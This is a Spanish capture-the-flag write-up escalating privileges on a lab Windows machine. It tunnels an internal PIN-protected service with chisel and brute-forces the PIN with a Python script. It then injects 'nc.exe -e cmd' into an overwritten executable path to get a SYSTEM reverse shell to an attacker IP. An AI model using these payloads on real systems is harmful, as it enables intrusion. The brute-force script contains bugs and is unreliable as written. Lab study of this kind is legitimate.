## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami /priv
```

No tenemos privilegios interesantes como el **SeImpersonatePrivilege**, el **SeLoadPrivilege** o el **SeBackupPrivilege**.
Teniendo este privilegio, podriamos hacer una copia (backup) de seguridad de elemento del systema como el **NTDS** que nos permitirian
recuperar los hashes de los usuarios del systema, entre ellos el usuario Administrator.

```bash
cd C:\Users\Administrator
cd C:\
netstat -nat
```

Aqui vemos un ejecutable llamado `bankv2.exe`. En este caso no lo vamos a analyzar. El **netstat** nos muestra un puerto **910** que no hemos visto
con nmap.

```bash
netstat -ano
tasklist
```

El comando `netstat -ano` nos permite ver el UID de los puertos abiertos y con el comando `tasklist`, miramos que servicio core para este UID.
En este caso vemos que es el mismo **bankv2.exe**.

Miramos con el **nc.exe** lo que es.

```bash
%temp%\nc.exe 127.0.0.1 910
#Output
Please enter your super secret 4 digit PIN code to login:
```

Como el puerto esta interno a la maquina, vamos a tirar de **chisel** para exponerlo a nuestra maquina de atacante y vamos a bruteforcear el pin con 
un script en python.

1. Descargamos chisel

    ```bash
    wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz
    mv chisel_1.7.6_windows_amd64.gz chisel.exe.gz
    gunzip chisel.exe.gz
    ```

1. Transferimos chisel a la maquina victima

    - Desde la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - Desde la maquina victima

        ```bash
        cd %temp%
        powershell iwr -uri http://10.10.17.51/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
        ```

1. Preparamos el chisel para linux en la maquina de atacante

    ```bash
    git clone https://github.com/jpillora/chisel/
    cd chisel
    go build -ldflags "-s -w" .
    upx chisel

    ./chisel server --reverse --port 1234
    ```

1. Lanzamos el cliente desde la maquina victima

    ```bash
    chisel.exe client 10.10.17.51:1234 R:910:127.0.0.1:910
    ```

Ahora ya tenemos accesso al puerto 910 de la maquina victima desde nuestra maquina. 

Ya podemos crear un script en python para que ataque este puerto. Pero primero creamos un diccionario de pins con crunch

```bash
crunch 4 4 -t %%%% > pins.txt
```

Creamos el `exploit.py`

```python
#!/usr/bin/python3

import pdb
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler

def tryPins():
    f = open("pins", "r")

    p1.log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    for pin in f.readlines():
        p1.status(b"Probando con PIN " + pin.strip('\n').encode())

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 910))

        data = s.recv(4096)

        s.send(pin.encode())

        data = s.recv(1024)

        if "Access denied" not in data:
            p1.success(b"El PIN es " + pin.strip('\n').encode())
            sys.exit(0)

if __name__ == '__main__':
    tryPins()
```

Si lanzamos el script, encontramos el pin.

Vemos que podemos ejecutar transferencia de e-coin con este programa, intentamos cosas

```bash
Please enter the amount of e-coins you would like to transfer:
[$] 10
[$] Transfering $10 using our e-coin transfer application.
[$] Executing e-coin transfer tool: C:\Users\Documents\transfer.exe

Please enter the amount of e-coins you would like to transfer:
[$] asfessefseafews
[$] Transfering $asfessefseafews using our e-coin transfer application.
[$] Executing e-coin transfer tool: C:\Users\Documents\transfer.exe

Please enter the amount of e-coins you would like to transfer:
[$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application.
[$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Aqui no parece que estamos frente a un BufferOverflow pero vemos que a partir de una serie de caracteres, sobre escribimos el ejecutable que permite
enviar los e-coins.

1. Creamos un pattern

    ```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
    #Output
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    ```

1. Lanzamos el ejecutable con esta cadena

    ```bash
    Please enter your super secret 4 digit PIN code to login:
    [$] 0021
    [$] PIN is correct, access granted!
    Please enter the amount of e-coins you would like to transfer:
    [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A using our e-coin transfer application.
    [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    ```

1. Miramos el offset

    ```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -q 0Ab1
    #Output
    [+] Exact match at offset 32
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el binario con el input malicioso

    ```bash
    python -c 'print "A"*32 + "C:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443"'
    #Output
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443

    Please enter your super secret 4 digit PIN code to login:
    [$] 0021
    [$] PIN is correct, access granted!
    Please enter the amount of e-coins you would like to transfer:
    [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443
    [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443 using our e-coin transfer application.
    [$] Executing e-coin transfer tool: C:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443
    ```

Ya vemos que hemos ganado acceso al systema como `nt authority\system` y podemos ver la flag.
